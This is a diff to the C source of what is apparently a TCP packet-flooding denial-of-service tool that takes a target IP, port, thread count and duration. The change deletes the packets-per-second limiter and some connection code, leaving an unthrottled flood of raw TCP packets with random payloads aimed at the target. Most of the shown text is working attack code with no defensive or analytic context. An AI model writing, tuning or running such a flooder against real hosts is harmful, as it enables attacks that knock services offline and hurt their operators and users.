@@ -1,4 +1,3 @@
-//old flooder
 #include <unistd.h>
 #include <time.h>
 #include <sys/types.h>
@@ -22,9 +21,8 @@
 static unsigned long int Q[4096], c = 362436;
 static unsigned int floodPort;
 static unsigned int packetsPerSecond;
-static unsigned int sleepTime = 100;
 static int limiter;
- 
+
 void init_rand(unsigned long int x)
 {
     int i;
@@ -231,15 +229,6 @@ void *flood(void *par1)
         if(packetCounter > 1000)
         {
             setup_fin_header(tcpHeader);
-            pthread_detach(pthread_self());
-            int sockfd, check;
-            struct sockaddr_in target;
-            sockfd = socket(AF_INET, SOCK_STREAM, 0);
-            bzero((char*)&target, sizeof(target));
-            target.sin_family = AF_INET;
-            target.sin_addr.s_addr = sin.sin_addr.s_addr;
-            target.sin_port = htons(floodPort);
-            check = connect(sockfd, (struct sockaddr*)&target, sizeof(target));
             packetCounter = 0;
         } 
         else 
@@ -255,7 +244,6 @@ void *flood(void *par1)
         randomLength = rand() % (120 - 90 + 1) + 90;
         data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
 
-        int a = 0;
         for (a = 0; a < randomLength; a++) 
         {
             *(char*)++data = (char)(rand() & 0xFFFF);
@@ -283,33 +271,22 @@ void *flood(void *par1)
         tcpHeader->check = csum((unsigned short*)pseudogram, psize);
         
         packetsPerSecond++;
-        if(i >= limiter)
-        {
-            i = 0;
-            usleep(9000);
-        }
-        i++;
     }
 }
 
 int main(int argc, char *argv[])
 {
-    if(argc < 6)
+    if(argc < 5)
     {
-        fprintf(stderr, "TCP PSH-ACK\n");
-        fprintf(stdout, "Usage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
+        fprintf(stderr, "Usage: %s <target IP> <port> <threads> <time>\n", argv[0]);
         exit(-1);
     }
  
-    fprintf(stdout, "Setting up Sockets...\n");
+    fprintf(stdout, "Starting Flood...\n");
  
     int numThreads = atoi(argv[3]);
     floodPort = atoi(argv[2]);
-    int maxPacketsPerSecond = atoi(argv[4]);
-    limiter = 0;
-    packetsPerSecond = 0;
     pthread_t thread[numThreads];
-    int multiplier = 20;
     int i;
 
     for(i = 0; i < numThreads; i++)
@@ -317,35 +294,9 @@ int main(int argc, char *argv[])
         pthread_create(&thread[i], NULL, &flood, (void*)argv[1]);
     }
 
-    fprintf(stdout, "Starting Flood...\n");
+for (i = 0; i < atoi(argv[4]); i++) {
+    sleep(1);
+}
 
-    for(i = 0; i < (atoi(argv[5]) * multiplier); i++)
-    {
-        usleep((1000 / multiplier) * 1000);
-        if((packetsPerSecond * multiplier) > maxPacketsPerSecond)
-        {
-            if(1 > limiter)
-            {
-                sleepTime += 100;
-            } 
-            else 
-            {
-                limiter--;
-            }
-        } 
-        else
-        {
-            limiter++;
-            if(sleepTime > 25)
-            {
-                sleepTime -= 25;
-            } 
-            else 
-            {
-                sleepTime = 0;
-            }
-        }
-        packetsPerSecond = 0;
-    }
     return 0;
 }
